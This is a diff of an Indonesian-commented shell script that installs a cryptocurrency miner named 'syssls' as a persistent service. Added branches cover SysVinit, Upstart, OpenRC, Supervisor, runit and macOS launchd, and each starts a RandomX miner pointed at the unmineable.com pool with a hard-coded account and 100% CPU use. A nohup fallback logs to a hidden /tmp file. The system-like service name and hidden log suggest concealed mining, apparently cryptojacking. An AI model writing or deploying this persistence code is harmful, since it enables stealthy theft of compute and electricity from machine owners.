@@ -91,34 +91,150 @@ WantedBy=multi-user.target" > /etc/systemd/system/syssls.service
 
         echo "Systemd service untuk SYSSLS telah dibuat, dimuat, dan dimulai."
         echo "Worker : VPS-$IP_TO_USE"
+    elif [ -d "/etc/init.d" ]; then
+        # SysVinit / init.d
+        echo "Menggunakan SysVinit"
+        echo -e "#!/bin/bash
+### BEGIN INIT INFO
+# Provides:          syssls
+# Required-Start:    $network $local_fs $syslog
+# Required-Stop:     $network $local_fs
+# Default-Start:     2 3 4 5
+# Default-Stop:      0 1 6
+# Short-Description: Start syssls miner
+### END INIT INFO
+
+case \"\$1\" in
+  start)
+    echo \"Starting SYSSLS...\"
+    $EXEC_PATH -a rx -o stratum+ssl://rx.unmineable.com:443 -u 54477070.$IP_TO_USE --cpu-max-threads-hint=100 &
+    ;;
+  stop)
+    echo \"Stopping SYSSLS...\"
+    pkill -f \"$EXEC_PATH\"
+    ;;
+  restart)
+    echo \"Restarting SYSSLS...\"
+    pkill -f \"$EXEC_PATH\"
+    $EXEC_PATH -a rx -o stratum+ssl://rx.unmineable.com:443 -u 54477070.$IP_TO_USE --cpu-max-threads-hint=100 &
+    ;;
+  *)
+    echo \"Usage: /etc/init.d/syssls {start|stop|restart}\"
+    exit 1
+    ;;
+esac
+exit 0" > /etc/init.d/syssls
+
+        chmod +x /etc/init.d/syssls
+        service syssls start
+
+        echo "Layanan dimulai menggunakan SysVinit."
+    elif command -v service >/dev/null 2>&1; then
+        # Upstart
+        echo "Menggunakan Upstart"
+        echo -e "# /etc/init/syssls.conf
+description \"SYSSLS Miner\"
+start on (net-device-up
+          and local-filesystems
+          and runlevel [2345])
+stop on runlevel [016]
+
+respawn
+exec /path/to/syssls -a rx -o stratum+ssl://rx.unmineable.com:443 -u 54477070.$IP_TO_USE --cpu-max-threads-hint=100" > /etc/init/syssls.conf
+
+        start syssls
+
+        echo "Layanan dimulai menggunakan Upstart."
+    elif command -v openrc >/dev/null 2>&1; then
+        # OpenRC
+        echo "Menggunakan OpenRC"
+        echo -e "#!/sbin/openrc-run
+
+command=/path/to/syssls
+command_args=\"-a rx -o stratum+ssl://rx.unmineable.com:443 -u 54477070.$IP_TO_USE --cpu-max-threads-hint=100\"
+pidfile=/run/syssls.pid
+
+depend() {
+    need net
+    use dns logger
+}
+
+start() {
+    ebegin \"Starting syssls miner\"
+    start-stop-daemon --start --background --make-pidfile --pidfile \$pidfile --exec \$command -- \$command_args
+    eend \$?
+}
+
+stop() {
+    ebegin \"Stopping syssls miner\"
+    start-stop-daemon --stop --pidfile \$pidfile
+    eend \$?
+}" > /etc/init.d/syssls
+
+        chmod +x /etc/init.d/syssls
+        /etc/init.d/syssls start
+
+        echo "Layanan dimulai menggunakan OpenRC."
+    elif command -v supervisorctl >/dev/null 2>&1; then
+        # Supervisor
+        echo "Menggunakan Supervisor"
+        echo -e "[program:syssls]
+command=/path/to/syssls -a rx -o stratum+ssl://rx.unmineable.com:443 -u 54477070.$IP_TO_USE --cpu-max-threads-hint=100
+autostart=true
+autorestart=true
+stderr_logfile=/var/log/syssls.err.log
+stdout_logfile=/var/log/syssls.out.log" > /etc/supervisor/conf.d/syssls.conf
+
+        supervisorctl reread
+        supervisorctl update
+        supervisorctl start syssls
+
+        echo "Layanan dimulai menggunakan Supervisor."
+    elif command -v runsv >/dev/null 2>&1; then
+        # runit
+        echo "Menggunakan runit"
+        echo -e "#!/bin/sh
+exec /path/to/syssls -a rx -o stratum+ssl://rx.unmineable.com:443 -u 54477070.$IP_TO_USE --cpu-max-threads-hint=100" > /etc/service/syssls/run
+
+        chmod +x /etc/service/syssls/run
+        sv start syssls
+
+        echo "Layanan dimulai menggunakan runit."
+    elif command -v launchctl >/dev/null 2>&1; then
+        # launchd (macOS)
+        echo "Menggunakan launchd"
+        echo -e "<?xml version=\"1.0\" encoding=\"UTF-8\"?>
+<plist version=\"1.0\">
+  <dict>
+    <key>Label</key>
+    <string>com.syssls.miner</string>
+    <key>ProgramArguments</key>
+    <array>
+      <string>/path/to/syssls</string>
+      <string>-a</string>
+      <string>rx</string>
+      <string>-o</string>
+      <string>stratum+ssl://rx.unmineable.com:443</string>
+      <string>-u</string>
+      <string>54477070.$IP_TO_USE</string>
+      <string>--cpu-max-threads-hint=100</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <true/>
+  </dict>
+</plist>" > /Library/LaunchDaemons/com.syssls.miner.plist
+
+        sudo launchctl load /Library/LaunchDaemons/com.syssls.miner.plist
+        sudo launchctl start com.syssls.miner
+
+        echo "Layanan dimulai menggunakan launchd."
     else
-        # Jika systemctl tidak ditemukan, menggunakan service atau init.d
-        echo "systemctl tidak ditemukan. Menggunakan alternatif lain..."
-
-        # Cek apakah service atau init.d ada
-        if command -v service >/dev/null 2>&1; then
-            # Gunakan service untuk memulai layanan
-            echo -e "#!/bin/bash
-$EXEC_PATH -a rx -o stratum+ssl://rx.unmineable.com:443 -u 54477070.$IP_TO_USE --cpu-max-threads-hint=100" > /etc/init.d/syssls
-
-            chmod +x /etc/init.d/syssls
-            service syssls start
-
-            echo "Layanan dimulai menggunakan service."
-        elif [ -d "/etc/init.d" ]; then
-            # Jika init.d tersedia, buat skrip init.d manual
-            echo -e "#!/bin/bash
-$EXEC_PATH -a rx -o stratum+ssl://rx.unmineable.com:443 -u 54477070.$IP_TO_USE --cpu-max-threads-hint=100" > /etc/init.d/syssls
-
-            chmod +x /etc/init.d/syssls
-            /etc/init.d/syssls start
-
-            echo "Layanan dimulai menggunakan /etc/init.d/syssls."
-        else
-            # Jika tidak ada systemctl, service, atau init.d, jalankan dengan nohup
-            nohup $EXEC_PATH -a rx -o stratum+ssl://rx.unmineable.com:443 -u 54477070.$HOSTNAME_REPLACED --cpu-max-threads-hint=100 > /tmp/.logacil 2>&1 &
-            echo "Tidak ada sistem init yang ditemukan. Menjalankan miner menggunakan nohup."
-        fi
+        # Jika tidak menggunakan sistem init, jalankan dengan nohup
+        nohup $EXEC_PATH -a rx -o stratum+ssl://rx.unmineable.com:443 -u 54477070.$HOSTNAME_REPLACED --cpu-max-threads-hint=100 > /tmp/.logacil 2>&1 &
+        echo "Menjalankan miner sebagai user non-root dengan nohup."
+        echo "Worker : $HOSTNAME_REPLACED"
     fi
 else
     # Jika bukan root, bunuh proses miner sebelum menjalankan nohup
